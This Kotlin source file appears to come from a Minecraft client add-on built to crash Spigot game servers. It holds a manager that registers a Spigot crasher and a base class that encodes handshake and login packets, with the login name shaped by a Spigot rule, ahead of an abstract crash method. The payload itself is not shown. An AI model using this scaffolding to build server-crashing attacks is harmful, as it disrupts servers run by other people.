package de.florianmichael.tarasande_crasher.crasher

import net.tarasandedevelopment.tarasande.Manager
import de.florianmichael.tarasande_crasher.crasher.impl.CrasherSpigot
import de.florianmichael.tarasande_crasher.spigot.SpigotRules
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.nio.charset.StandardCharsets

object ManagerCrasher : Manager<Crasher>() {

    init {
        add(
            CrasherSpigot()
        )
    }
}

abstract class Crasher(val name: String) {

    fun createHandshakePacket(address: String, port: Int, protocol: Int): ByteArray {
        val data = ByteArrayOutputStream()
        val out = DataOutputStream(data)

        writeVarInt(0, out)
        writeVarInt(protocol, out)
        writeString(address, out)
        out.writeShort(port)
        writeVarInt(2, out)

        val bytes = data.toByteArray()
        data.close()
        return bytes
    }

    fun createHelloWorldPacket(name: String): ByteArray {
        val data = ByteArrayOutputStream()
        val out = DataOutputStream(data)

        writeVarInt(0, out)
        writeString(SpigotRules.spigotRule186(name), out)

        val bytes = data.toByteArray()
        data.close()
        return bytes
    }

    fun writePacket(data: ByteArray, output: DataOutputStream) {
        writeVarInt(data.size, output)
        output.write(data)
    }

    private fun writeVarInt(value: Int, output: DataOutputStream) {
        @Suppress("NAME_SHADOWING")
        var value = value
        while (value and -0x80 !== 0x0) {
            output.writeByte(value and 0x7F or 0x80)
            value = value ushr 7
        }
        output.writeByte(value)
    }

    private fun writeString(value: String, output: DataOutputStream) {
        val data = value.toByteArray(StandardCharsets.UTF_8)
        writeVarInt(data.size, output)
        output.write(data, 0, data.size)
    }

    abstract fun crash(address: String, port: Int)
}
